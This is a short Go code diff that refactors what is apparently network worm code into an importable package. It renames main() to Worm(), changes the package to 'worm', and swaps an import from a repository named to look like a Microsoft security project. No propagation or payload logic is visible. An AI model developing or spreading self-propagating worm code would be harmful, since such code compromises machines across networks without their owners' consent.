@@ -1,4 +1,4 @@
-package main
+package worm
 
 import (
 	"fmt"
@@ -6,7 +6,7 @@ import (
 	"os"
 	"sync"
 	"time"
-	"github.com/MicrosoftMalwareDefender/wormpackage"
+	"github.com/MicrosoftMalwareDefender/miniature-octo-parakeet"
 )
 
 var (
@@ -15,7 +15,7 @@ var (
 	wg              sync.WaitGroup
 )
 
-func main() {
+func Worm() {
 	// Get local IP address
 	var err error
 	localIP, err = getLocalIP()
